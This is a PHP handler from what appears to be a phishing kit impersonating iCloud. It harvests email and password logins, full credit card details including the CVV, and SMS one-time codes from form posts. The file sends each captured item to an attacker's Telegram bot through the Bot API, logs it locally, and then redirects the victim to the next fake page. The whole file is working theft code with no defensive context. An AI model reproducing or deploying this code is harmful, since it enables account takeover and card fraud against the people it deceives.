<?php 
session_start();
require 'config.php';
require 'botMother/botMother.php';

$bm = new botMother();
function sendTotelegram($data){
    global $bot;
    global $chat_id;

    $data = urlencode($data);
    $api = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$chat_id&text=$data";
    $c = curl_init($api);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($c);
    curl_close($c);
    return $res;

}

$ip = $_SERVER['REMOTE_ADDR'];


if(isset($_POST['email'])){

$msg = "
icloud.com New login
--------------------------
email: ".$_POST['email']."
Pass: ".$_POST['pass']."
--------------------------
IP: $ip
";

sendTotelegram($msg);

header("location: cc.php");


}


if(isset($_POST['cc'])){
$_SESSION['_cc'] = $_POST['cc'];
$msg = "
icloud.com - New CC 
--------------------------
CC: ".$_POST['cc']."
EXP: ".$_POST['exp']."
CVV: ".$_POST['cvv']."
Full Name: ".$_POST['holder-name']."
--------------------------
IP: $ip
";

sendTotelegram($msg);

header("location: wait.php?next=sms.php");
    
}
    


if(isset($_POST['c1'])){

$msg = "
icloud.com - New OTP
--------------------------
Cc: ".$_SESSION['_cc']."
Otp: ".$_POST['c1'].$_POST['c2'].$_POST['c3'].$_POST['c4'].$_POST['c5'].$_POST['c6']."
--------------------------
IP: $ip
";

sendTotelegram($msg);

if(isset($_POST['done'])){
    die(header("location: done.php"));
}
header("location: wait.php?next=sms.php?error");

}
    
 if(@$msg!=""){
    $bm->logTXT($msg);
}
    
?>